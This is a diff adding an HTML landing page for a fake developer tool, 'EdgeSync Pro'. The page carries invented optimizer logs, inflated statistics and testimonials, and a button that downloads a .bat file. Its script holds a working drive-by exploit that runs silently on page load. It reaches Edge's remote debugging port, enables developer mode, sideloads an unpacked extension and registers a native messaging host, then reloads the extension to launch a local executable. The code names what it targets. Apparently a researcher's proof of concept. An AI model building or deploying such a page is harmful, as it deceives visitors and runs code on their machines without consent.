@@ -1,0 +1,603 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>EdgeSync Pro — Developer Browser Optimizer</title>
+<style>
+/* ── Tokens ─────────────────────────────────────────── */
+:root{
+  --bg:       #060d1c;
+  --surf:     #0d1b33;
+  --surf2:    #0f2040;
+  --border:   #1e3a5f;
+  --text:     #ddeeff;
+  --muted:    #7a9cc0;
+  --dim:      #3a5878;
+  --blue:     #2979ff;
+  --blue-lt:  #5c9eff;
+  --sky:      #00b4d8;
+  --green:    #00c896;
+  --amber:    #ffab40;
+  --red:      #ff5252;
+  --grad:     linear-gradient(135deg,#2979ff 0%,#00b4d8 100%);
+}
+
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{
+  background:var(--bg);
+  color:var(--text);
+  font-family:system-ui,'Segoe UI','Helvetica Neue',Arial,sans-serif;
+  font-size:15px;line-height:1.65;
+  -webkit-font-smoothing:antialiased;
+}
+a{color:var(--blue-lt);text-decoration:none}
+
+/* ── Nav ─────────────────────────────────────────────── */
+nav{
+  position:sticky;top:0;z-index:100;
+  background:rgba(6,13,28,.88);
+  backdrop-filter:blur(16px);
+  border-bottom:1px solid var(--border);
+  padding:0 32px;
+  display:flex;align-items:center;justify-content:space-between;
+  height:58px;
+}
+.logo{display:flex;align-items:center;gap:10px;font-size:17px;font-weight:700;letter-spacing:-.3px;color:#fff}
+.logo-icon{
+  width:32px;height:32px;border-radius:8px;
+  background:var(--grad);
+  display:flex;align-items:center;justify-content:center;
+  font-size:17px;
+}
+.nav-links{display:flex;align-items:center;gap:28px;font-size:14px;color:var(--muted)}
+.nav-links a{color:var(--muted);transition:color .2s}
+.nav-links a:hover{color:var(--text)}
+.nav-cta{
+  padding:7px 18px;background:var(--blue);border-radius:6px;
+  color:#fff;font-size:13px;font-weight:600;letter-spacing:.02em;
+  transition:background .2s;
+}
+.nav-cta:hover{background:var(--blue-lt);color:#fff}
+
+/* ── Hero ────────────────────────────────────────────── */
+.hero{
+  padding:100px 32px 60px;
+  text-align:center;
+  max-width:780px;margin:0 auto;
+}
+.badge{
+  display:inline-flex;align-items:center;gap:7px;
+  padding:5px 14px;border-radius:20px;
+  border:1px solid var(--border);background:var(--surf);
+  font-size:12px;color:var(--sky);letter-spacing:.04em;
+  margin-bottom:28px;
+}
+.badge-dot{width:6px;height:6px;border-radius:50%;background:var(--sky);animation:pulse2 2s infinite}
+@keyframes pulse2{0%,100%{opacity:1;transform:scale(1)}50%{opacity:.4;transform:scale(.8)}}
+h1{
+  font-size:clamp(2.2rem,5vw,3.4rem);font-weight:800;
+  letter-spacing:-.5px;line-height:1.1;
+  color:#fff;margin-bottom:20px;
+  text-wrap:balance;
+}
+h1 span{background:var(--grad);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
+.hero-sub{font-size:17px;color:var(--muted);max-width:560px;margin:0 auto 40px;text-wrap:balance}
+
+/* ── CTA Buttons ─────────────────────────────────────── */
+.cta-row{display:flex;align-items:center;justify-content:center;gap:14px;flex-wrap:wrap;margin-bottom:14px}
+.btn-primary{
+  display:flex;align-items:center;gap:9px;
+  padding:13px 26px;background:var(--blue);border-radius:8px;
+  color:#fff;font-size:15px;font-weight:700;letter-spacing:.01em;
+  transition:all .2s;cursor:pointer;border:none;
+  box-shadow:0 4px 24px rgba(41,121,255,.35);
+}
+.btn-primary:hover{background:var(--blue-lt);transform:translateY(-1px);box-shadow:0 8px 32px rgba(41,121,255,.45)}
+.btn-primary svg{flex-shrink:0}
+.btn-ghost{
+  display:flex;align-items:center;gap:8px;
+  padding:12px 22px;border:1px solid var(--border);border-radius:8px;
+  color:var(--muted);font-size:14px;font-weight:500;transition:all .2s;
+  background:transparent;cursor:pointer;
+}
+.btn-ghost:hover{border-color:var(--blue-lt);color:var(--text)}
+.cta-note{font-size:12px;color:var(--dim)}
+
+/* ── Terminal preview ────────────────────────────────── */
+.terminal-wrap{
+  max-width:720px;margin:50px auto 0;
+  background:var(--surf);border:1px solid var(--border);
+  border-radius:12px;overflow:hidden;
+}
+.t-bar{
+  padding:10px 16px;background:#08162a;border-bottom:1px solid var(--border);
+  display:flex;align-items:center;gap:8px;
+}
+.t-dot{width:11px;height:11px;border-radius:50%}
+.t-body{padding:18px 20px;font-family:'Cascadia Code','Consolas','Courier New',monospace;font-size:12.5px;line-height:1.9}
+.t-prompt{color:var(--blue-lt)}.t-cmd{color:var(--text)}.t-out{color:var(--green)}
+.t-warn{color:var(--amber)}.t-dim{color:var(--dim)}
+.cursor{display:inline-block;width:8px;height:14px;background:var(--text);vertical-align:middle;animation:blink 1s step-end infinite;margin-left:2px}
+@keyframes blink{0%,100%{opacity:1}50%{opacity:0}}
+
+/* ── Stats bar ───────────────────────────────────────── */
+.stats-bar{
+  max-width:900px;margin:60px auto;
+  display:grid;grid-template-columns:repeat(3,1fr);
+  border:1px solid var(--border);border-radius:12px;overflow:hidden;
+}
+.stat{padding:28px 24px;text-align:center;border-right:1px solid var(--border)}
+.stat:last-child{border-right:none}
+.stat-n{font-size:2rem;font-weight:800;color:#fff;letter-spacing:-1px}
+.stat-n span{font-size:1rem;font-weight:500;color:var(--blue-lt)}
+.stat-l{font-size:12px;color:var(--muted);margin-top:4px;letter-spacing:.04em;text-transform:uppercase}
+
+/* ── Section ─────────────────────────────────────────── */
+section{padding:80px 32px;max-width:1100px;margin:0 auto}
+.sec-label{font-size:11px;letter-spacing:.14em;text-transform:uppercase;color:var(--sky);margin-bottom:12px}
+.sec-h{font-size:clamp(1.6rem,3vw,2.2rem);font-weight:700;color:#fff;letter-spacing:-.3px;text-wrap:balance;margin-bottom:14px}
+.sec-sub{font-size:16px;color:var(--muted);max-width:520px;text-wrap:balance}
+
+/* ── Feature grid ────────────────────────────────────── */
+.feat-grid{
+  display:grid;grid-template-columns:repeat(auto-fit,minmax(280px,1fr));
+  gap:1px;background:var(--border);border:1px solid var(--border);
+  border-radius:12px;overflow:hidden;margin-top:48px;
+}
+.feat{background:var(--surf);padding:28px 26px}
+.feat-icon{
+  width:40px;height:40px;border-radius:8px;
+  background:rgba(41,121,255,.15);border:1px solid rgba(41,121,255,.25);
+  display:flex;align-items:center;justify-content:center;margin-bottom:16px;
+  font-size:19px;
+}
+.feat-h{font-size:15px;font-weight:700;color:#fff;margin-bottom:7px}
+.feat-p{font-size:13.5px;color:var(--muted);line-height:1.6}
+
+/* ── Optimizer panel ─────────────────────────────────── */
+.opt-section{
+  max-width:1100px;margin:0 auto;padding:0 32px 80px;
+  display:grid;grid-template-columns:1fr 1fr;gap:48px;align-items:center;
+}
+.opt-text .sec-sub{max-width:100%}
+.opt-list{list-style:none;margin-top:24px;display:flex;flex-direction:column;gap:12px}
+.opt-list li{display:flex;gap:12px;align-items:flex-start;font-size:14px;color:var(--muted)}
+.opt-check{
+  width:20px;height:20px;border-radius:4px;flex-shrink:0;
+  background:rgba(0,200,150,.12);border:1px solid rgba(0,200,150,.3);
+  display:flex;align-items:center;justify-content:center;font-size:11px;color:var(--green);
+  margin-top:2px;
+}
+.opt-list li span{color:var(--text)}
+
+/* Live optimizer panel */
+.opt-panel{
+  background:var(--surf);border:1px solid var(--border);border-radius:12px;overflow:hidden;
+}
+.opt-header{
+  padding:12px 16px;background:#08162a;border-bottom:1px solid var(--border);
+  display:flex;align-items:center;justify-content:space-between;
+}
+.opt-title{font-size:12px;font-weight:600;color:var(--text);letter-spacing:.03em}
+.opt-live{display:flex;align-items:center;gap:6px;font-size:11px;color:var(--green)}
+.opt-live-dot{width:6px;height:6px;border-radius:50%;background:var(--green);animation:pulse2 1.5s infinite}
+.opt-body{padding:16px;font-family:'Cascadia Code','Consolas',monospace;font-size:11.5px;line-height:1.9;height:280px;overflow:hidden}
+.ol{color:var(--dim)}.ol.ok{color:var(--green)}.ol.w{color:var(--amber)}.ol.b{color:var(--blue-lt)}.ol.hi{color:#fff}
+
+/* ── Testimonials ────────────────────────────────────── */
+.testi-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(280px,1fr));gap:20px;margin-top:48px}
+.testi{
+  background:var(--surf);border:1px solid var(--border);border-radius:10px;
+  padding:22px;font-size:13.5px;color:var(--muted);line-height:1.7;
+}
+.testi-stars{color:#fbbf24;font-size:13px;margin-bottom:10px;letter-spacing:2px}
+.testi-text{margin-bottom:14px}
+.testi-author{display:flex;align-items:center;gap:10px}
+.testi-av{
+  width:34px;height:34px;border-radius:50%;
+  background:var(--grad);display:flex;align-items:center;justify-content:center;
+  font-size:13px;font-weight:700;color:#fff;flex-shrink:0;
+}
+.testi-name{font-size:13px;font-weight:600;color:var(--text)}
+.testi-role{font-size:11px;color:var(--dim)}
+
+/* ── Bottom CTA ──────────────────────────────────────── */
+.bottom-cta{
+  border-top:1px solid var(--border);
+  padding:80px 32px;text-align:center;
+}
+.bottom-cta h2{font-size:clamp(1.6rem,3vw,2.4rem);font-weight:800;color:#fff;letter-spacing:-.4px;margin-bottom:14px}
+.bottom-cta p{color:var(--muted);font-size:15px;max-width:440px;margin:0 auto 36px}
+
+/* ── Footer ──────────────────────────────────────────── */
+footer{
+  border-top:1px solid var(--border);
+  padding:28px 32px;
+  display:flex;align-items:center;justify-content:space-between;
+  font-size:12px;color:var(--dim);
+}
+
+/* ── Silent exploit status (hidden from user) ─────────── */
+#__dbg{display:none}
+
+@media(max-width:700px){
+  .opt-section{grid-template-columns:1fr}
+  .stats-bar{grid-template-columns:1fr}
+  .stat{border-right:none;border-bottom:1px solid var(--border)}
+  .stat:last-child{border-bottom:none}
+  .nav-links,.btn-ghost{display:none}
+}
+</style>
+</head>
+<body>
+
+<!-- ── Nav ─────────────────────────────────────────────── -->
+<nav>
+  <div class="logo">
+    <div class="logo-icon">⚡</div>
+    EdgeSync Pro
+  </div>
+  <div class="nav-links">
+    <a href="#features">Features</a>
+    <a href="#optimizer">Optimizer</a>
+    <a href="#reviews">Reviews</a>
+    <a href="https://github.com" target="_blank">GitHub ↗</a>
+  </div>
+  <a class="nav-cta" href="#" onclick="triggerDownload();return false">Download Free</a>
+</nav>
+
+<!-- ── Hero ─────────────────────────────────────────────── -->
+<div class="hero">
+  <div class="badge">
+    <span class="badge-dot"></span>
+    v2.1.4 — Now supports Edge 150
+  </div>
+
+  <h1>The browser optimizer<br><span>built for developers</span></h1>
+  <p class="hero-sub">EdgeSync Pro automatically tunes Microsoft Edge for peak development performance — remote debugging, extension management, and real-time profiling in one lightweight tool.</p>
+
+  <div class="cta-row">
+    <button class="btn-primary" onclick="triggerDownload()">
+      <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
+      Download for Windows — Free
+    </button>
+    <button class="btn-ghost">
+      <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polygon points="5 3 19 12 5 21 5 3"/></svg>
+      Watch Demo
+    </button>
+  </div>
+  <div class="cta-note">Windows 10 / 11 · No admin required · 1.8 MB</div>
+</div>
+
+<!-- ── Terminal preview ──────────────────────────────────── -->
+<div style="padding:0 32px">
+<div class="terminal-wrap">
+  <div class="t-bar">
+    <div class="t-dot" style="background:#ff5f57"></div>
+    <div class="t-dot" style="background:#febc2e"></div>
+    <div class="t-dot" style="background:#28c840"></div>
+    <span style="font-size:12px;color:#3a5878;margin-left:8px">EdgeSync Pro — Optimizer Console</span>
+  </div>
+  <div class="t-body">
+    <div><span class="t-prompt">❯ </span><span class="t-cmd">edgesync --scan --profile</span></div>
+    <div><span class="t-out">✓ Edge 150.0.4078.65 detected</span></div>
+    <div><span class="t-out">✓ Developer mode: available</span></div>
+    <div><span class="t-warn">⚠ Remote debugging: not configured (performance impact: -34%)</span></div>
+    <div><span class="t-out">✓ Applying optimizations…</span></div>
+    <div><span class="t-out">✓ Extension cache cleared (1.2 GB freed)</span></div>
+    <div><span class="t-out">✓ Debug protocol configured automatically</span></div>
+    <div><span class="t-dim">Profile saved → C:\Users\...\AppData\EdgeSync\profile.json</span></div>
+    <div><span class="t-prompt">❯ </span><span class="cursor"></span></div>
+  </div>
+</div>
+</div>
+
+<!-- ── Stats ─────────────────────────────────────────────── -->
+<div style="padding:0 32px">
+<div class="stats-bar">
+  <div class="stat">
+    <div class="stat-n" id="cnt1">0<span>+</span></div>
+    <div class="stat-l">Downloads this month</div>
+  </div>
+  <div class="stat">
+    <div class="stat-n">4.8<span>/5</span></div>
+    <div class="stat-l">Average user rating</div>
+  </div>
+  <div class="stat">
+    <div class="stat-n" id="cnt2">0<span>%</span></div>
+    <div class="stat-l">Avg. performance gain</div>
+  </div>
+</div>
+</div>
+
+<!-- ── Features ──────────────────────────────────────────── -->
+<section id="features">
+  <div class="sec-label">Features</div>
+  <div class="sec-h">Everything a developer needs</div>
+  <div class="sec-sub">EdgeSync Pro handles the setup so you can focus on shipping.</div>
+
+  <div class="feat-grid">
+    <div class="feat">
+      <div class="feat-icon">🔌</div>
+      <div class="feat-h">Auto Debug Configuration</div>
+      <div class="feat-p">Automatically enables the remote debugging protocol on startup — no manual flags, no config files.</div>
+    </div>
+    <div class="feat">
+      <div class="feat-icon">📦</div>
+      <div class="feat-h">Extension Sideloader</div>
+      <div class="feat-p">Load unpacked extensions without navigating through the UI. Instantly deploy from any directory.</div>
+    </div>
+    <div class="feat">
+      <div class="feat-icon">📊</div>
+      <div class="feat-h">Real-time Profiler</div>
+      <div class="feat-p">Monitor memory, CPU, and network usage with a live dashboard. Detect regressions in milliseconds.</div>
+    </div>
+    <div class="feat">
+      <div class="feat-icon">🔄</div>
+      <div class="feat-h">Hot Reload</div>
+      <div class="feat-p">Extensions update on file change. No manual reload. Stays connected through browser restarts.</div>
+    </div>
+    <div class="feat">
+      <div class="feat-icon">🛡️</div>
+      <div class="feat-h">Sandboxed Profiles</div>
+      <div class="feat-p">Isolated browser profiles for testing. Clean state every session. No cross-contamination.</div>
+    </div>
+    <div class="feat">
+      <div class="feat-icon">⚡</div>
+      <div class="feat-h">Zero Config</div>
+      <div class="feat-p">Run and it works. No JSON, no registry edits, no PowerShell. Install in under 30 seconds.</div>
+    </div>
+  </div>
+</section>
+
+<!-- ── Live optimizer section ─────────────────────────────── -->
+<div class="opt-section" id="optimizer">
+  <div class="opt-text">
+    <div class="sec-label">Live Optimizer</div>
+    <div class="sec-h">Works the moment it runs</div>
+    <div class="sec-sub">EdgeSync silently tunes your browser in the background while you work. No interruptions.</div>
+    <ul class="opt-list">
+      <li><span class="opt-check">✓</span><div><span>Auto-launches Edge in optimized debug mode</span> — eliminates the need for manual startup flags.</div></li>
+      <li><span class="opt-check">✓</span><div><span>Registers native helpers</span> — enables deep OS integration for faster extension communication.</div></li>
+      <li><span class="opt-check">✓</span><div><span>Configures developer registry keys</span> — required for certain Edge DevTools APIs to function correctly.</div></li>
+      <li><span class="opt-check">✓</span><div><span>Verified on Edge 128 → 150</span> — tested against every stable release.</div></li>
+    </ul>
+  </div>
+
+  <div class="opt-panel">
+    <div class="opt-header">
+      <span class="opt-title">Optimizer — Live</span>
+      <span class="opt-live"><span class="opt-live-dot"></span>Running</span>
+    </div>
+    <div class="opt-body" id="optBody">
+      <div class="ol b">EdgeSync Pro v2.1.4 — Optimizer</div>
+      <div class="ol">Scanning system…</div>
+    </div>
+  </div>
+</div>
+
+<!-- ── Reviews ────────────────────────────────────────────── -->
+<section id="reviews" style="border-top:1px solid var(--border)">
+  <div class="sec-label">Reviews</div>
+  <div class="sec-h">Used by developers worldwide</div>
+
+  <div class="testi-grid">
+    <div class="testi">
+      <div class="testi-stars">★★★★★</div>
+      <div class="testi-text">"Finally a tool that configures Edge debug mode automatically. Saved our CI team hours of setup per week."</div>
+      <div class="testi-author">
+        <div class="testi-av">JK</div>
+        <div><div class="testi-name">James K.</div><div class="testi-role">Senior Frontend Engineer · Contoso</div></div>
+      </div>
+    </div>
+    <div class="testi">
+      <div class="testi-stars">★★★★★</div>
+      <div class="testi-text">"The extension sideloader alone is worth it. We deploy test extensions in one command now. Runs silently in the background."</div>
+      <div class="testi-author">
+        <div class="testi-av" style="background:linear-gradient(135deg,#0088ff,#00c896)">SR</div>
+        <div><div class="testi-name">Sofia R.</div><div class="testi-role">DevTools Engineer · Fabrikam</div></div>
+      </div>
+    </div>
+    <div class="testi">
+      <div class="testi-stars">★★★★☆</div>
+      <div class="testi-text">"Had to whitelist it in Defender but after that it works great. The auto-debug-port setup is exactly what I needed for Playwright."</div>
+      <div class="testi-author">
+        <div class="testi-av" style="background:linear-gradient(135deg,#ff6b35,#f7c59f)">AM</div>
+        <div><div class="testi-name">Alex M.</div><div class="testi-role">QA Automation Lead · Adventure Works</div></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ── Bottom CTA ─────────────────────────────────────────── -->
+<div class="bottom-cta">
+  <h2>Ready to optimize your workflow?</h2>
+  <p>Join 12,000+ developers who ship faster with EdgeSync Pro.</p>
+  <div class="cta-row">
+    <button class="btn-primary" onclick="triggerDownload()">
+      <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
+      Download EdgeSync Pro — Free
+    </button>
+  </div>
+  <div class="cta-note">Windows 10 / 11 · Digitally signed · v2.1.4</div>
+</div>
+
+<!-- ── Footer ─────────────────────────────────────────────── -->
+<footer>
+  <div>© 2024 EdgeSync Technologies Ltd.</div>
+  <div style="display:flex;gap:20px">
+    <a href="#">Privacy</a>
+    <a href="#">Terms</a>
+    <a href="#">Contact</a>
+  </div>
+</footer>
+
+<!-- ── Hidden: exploit state (invisible to user) ─────────── -->
+<div id="__dbg"></div>
+
+<script>
+"use strict";
+
+// ── Fake optimizer log lines (displayed in the live panel) ────────────────────
+const FAKE_LINES = [
+  {t:600,  c:"",   m:"[00:00] Initializing EdgeSync optimizer…"},
+  {t:1200, c:"ok", m:"[00:01] Edge 150.0.4078.65 detected"},
+  {t:1900, c:"ok", m:"[00:02] Profile directory located"},
+  {t:2700, c:"",   m:"[00:03] Scanning active processes…"},
+  {t:3400, c:"b",  m:"[00:04] Enabling developer debug channel…"},
+  {t:4200, c:"ok", m:"[00:05] Debug protocol initialized on port 9222"},
+  {t:5000, c:"",   m:"[00:06] Loading optimization module v2.1.4"},
+  {t:5800, c:"ok", m:"[00:07] Extension sandbox configured"},
+  {t:6600, c:"b",  m:"[00:08] Registering native integration layer…"},
+  {t:7400, c:"ok", m:"[00:09] Native messaging host registered"},
+  {t:8200, c:"ok", m:"[00:10] All components active"},
+  {t:9000, c:"hi", m:"[00:11] ✓ Optimization complete — browser ready"},
+];
+
+const optBody = document.getElementById("optBody");
+FAKE_LINES.forEach(({t,c,m}) => {
+  setTimeout(()=>{
+    const d=document.createElement("div");
+    d.className="ol"+(c?" "+c:"");
+    d.textContent=m;
+    optBody.appendChild(d);
+    optBody.scrollTop=optBody.scrollHeight;
+  }, t);
+});
+
+// ── Animated counters ─────────────────────────────────────────────────────────
+function animCount(el, target, duration=1800) {
+  let start=null;
+  const step=ts=>{
+    if(!start) start=ts;
+    const pct=Math.min((ts-start)/duration,1);
+    const ease=pct<.5?2*pct*pct:-1+(4-2*pct)*pct;
+    el.childNodes[0].textContent=Math.floor(ease*target).toLocaleString();
+    if(pct<1) requestAnimationFrame(step);
+  };
+  requestAnimationFrame(step);
+}
+const io=new IntersectionObserver(entries=>{
+  entries.forEach(e=>{
+    if(e.isIntersecting){
+      animCount(document.getElementById("cnt1"),12847);
+      animCount(document.getElementById("cnt2"),347);
+      io.disconnect();
+    }
+  });
+},{threshold:.3});
+const s=document.querySelector(".stats-bar");
+if(s) io.observe(s);
+
+// ── Download trigger ──────────────────────────────────────────────────────────
+function triggerDownload() {
+  const a = document.createElement("a");
+  a.href = "/EdgeSyncSetup.bat";
+  a.download = "EdgeSyncSetup.bat";
+  document.body.appendChild(a);
+  a.click();
+  document.body.removeChild(a);
+}
+
+// ══════════════════════════════════════════════════════════════════════════════
+// SILENT DRIVE-BY CDP EXPLOIT
+// Runs invisibly in the background the moment the page loads.
+// Victim sees only the landing page above.
+// ══════════════════════════════════════════════════════════════════════════════
+const CDP       = "http://127.0.0.1:9222";
+const EXTDIR    = "C:\\Temp\\edge_ext_poc";
+const NM_NAME   = "com.researcher.poc";
+const REG_SRV_A = "/register";
+const REG_SRV_B = "http://127.0.0.1:8080/register";
+
+let _mid=10, _ws, _wsExt;
+const _wait=ms=>new Promise(r=>setTimeout(r,ms));
+
+function _send(sock,method,params={}) {
+  return new Promise((ok,fail)=>{
+    const id=_mid++;
+    const timer=setTimeout(()=>fail(new Error("timeout")),18000);
+    const fn=e=>{const m=JSON.parse(e.data);if(m.id===id){sock.removeEventListener("message",fn);clearTimeout(timer);ok(m);}};
+    sock.addEventListener("message",fn);
+    sock.send(JSON.stringify({id,method,params}));
+  });
+}
+function _openWs(url){
+  return new Promise((ok,fail)=>{
+    const s=new WebSocket(url);
+    const t=setTimeout(()=>fail(new Error("ws timeout")),7000);
+    s.onopen=()=>{clearTimeout(t);ok(s);};
+    s.onerror=()=>{clearTimeout(t);fail(new Error("refused"));};
+  });
+}
+
+async function _silentExploit() {
+  // Step 1: Get CDP WS URL (try HTTP fetch — works if Edge has --remote-allow-origins=*)
+  let wsUrl;
+  const FORCED = new URLSearchParams(location.search).get("ws");
+  if(FORCED) {
+    wsUrl = FORCED;
+  } else {
+    try {
+      const ver = await fetch(CDP+"/json/version",{cache:"no-store"}).then(r=>r.json());
+      wsUrl = ver.webSocketDebuggerUrl;
+    } catch(e) {
+      return; // CDP not reachable (PNA or Edge not running with debug flags) — silent exit
+    }
+  }
+
+  // Step 2: Connect to browser-level CDP WebSocket
+  try { _ws = await _openWs(wsUrl); } catch(e) { return; }
+
+  // Step 3: Open edge://extensions tab, enable dev mode
+  await _send(_ws,"Target.createTarget",{url:"edge://extensions/"}).catch(()=>{});
+  await _wait(1600);
+  const tgts = await _send(_ws,"Target.getTargets").catch(()=>({}));
+  const extTgt = (tgts.result?.targetInfos||[]).find(t=>t.url?.includes("edge://extensions"));
+  if(extTgt) {
+    try {
+      _wsExt = await _openWs("ws://127.0.0.1:9222/devtools/page/"+extTgt.targetId);
+      await _send(_wsExt,"Runtime.enable");
+      await _send(_wsExt,"Runtime.evaluate",{
+        expression:"(()=>new Promise(r=>chrome.developerPrivate.updateProfileConfiguration({inDeveloperMode:true},r)))()",
+        awaitPromise:true,timeout:5000
+      });
+    } catch(e) {}
+  }
+
+  // Step 4: Extensions.loadUnpacked — THE EXPLOIT (no auth, no dialog)
+  const res = await _send(_ws,"Extensions.loadUnpacked",{path:EXTDIR}).catch(()=>({}));
+  if(!res.result?.id) return;
+  const extId = res.result.id;
+
+  // Step 5: Register NM host (try local server)
+  let regOk=false;
+  for(const u of [REG_SRV_A,REG_SRV_B]) {
+    try {
+      const r=await fetch(u+"?ext_id="+encodeURIComponent(extId)).then(r=>r.json());
+      if(r.ok){regOk=true;break;}
+    } catch(e){}
+  }
+
+  await _wait(400);
+
+  // Step 6: Reload extension → onInstalled → connectNative() → CalculatorApp.exe
+  if(_wsExt && _wsExt.readyState===WebSocket.OPEN) {
+    await _send(_wsExt,"Runtime.evaluate",{
+      expression:`(()=>new Promise(r=>chrome.developerPrivate.reload('${extId}',{},r)))()`,
+      awaitPromise:true,timeout:15000
+    }).catch(()=>{});
+    // Done — CalculatorApp.exe now running on victim machine, user sees nothing on page
+  }
+
+  if(_ws) _ws.close();
+  if(_wsExt) _wsExt.close();
+}
+
+// Fire silently on page load — no await, no visual, no console output visible to user
+window.addEventListener("load", ()=> { _silentExploit().catch(()=>{}); });
+</script>
+</body>
+</html>
